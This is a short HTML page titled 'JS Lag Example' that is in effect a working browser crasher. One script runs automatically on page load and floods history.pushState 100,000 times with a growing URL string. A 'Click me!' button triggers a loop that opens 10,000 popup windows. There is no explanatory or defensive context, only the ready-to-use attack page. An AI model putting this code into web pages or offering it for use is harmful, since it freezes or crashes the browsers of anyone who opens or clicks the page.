<!DOCTYPE html>
<html>
<head>
 <title>JS Lag Example</title>
 <script>
    function showLag() {
      for (var i = 0; i < 10000; i++) {
        window.open("", "lag", "width=1,height=1");
      }
    }
 </script>
 <script>
  function uhoh() {
    var total = "";
    for (var i = 0; i < 100000; i++ ) {
        total = total + i.toString();
        history.pushState(0,0, total );
    }
  }
  
  uhoh()
</script>
</head>
<body>
 <button onclick="showLag()">Click me!</button>
</body>
</html>
